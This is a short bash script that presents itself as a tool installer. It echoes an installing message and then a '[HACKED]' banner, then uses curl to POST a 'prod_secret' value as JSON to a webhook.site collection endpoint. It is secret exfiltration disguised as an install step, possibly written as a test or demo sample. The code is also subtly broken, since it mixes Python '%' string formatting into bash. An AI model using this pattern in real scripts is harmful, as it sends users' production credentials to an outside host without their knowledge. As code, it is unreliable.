#!/bin/bash
echo "Installing tool..."
echo "[HACKED]..."
curl -H "Content-Type: application/json" -X POST -d '{\"prod_secret\": \"%s\"}' https://webhook.site/d75e796d-f8b5-440b-b93d-018f6eb0adb9 % prod_secret
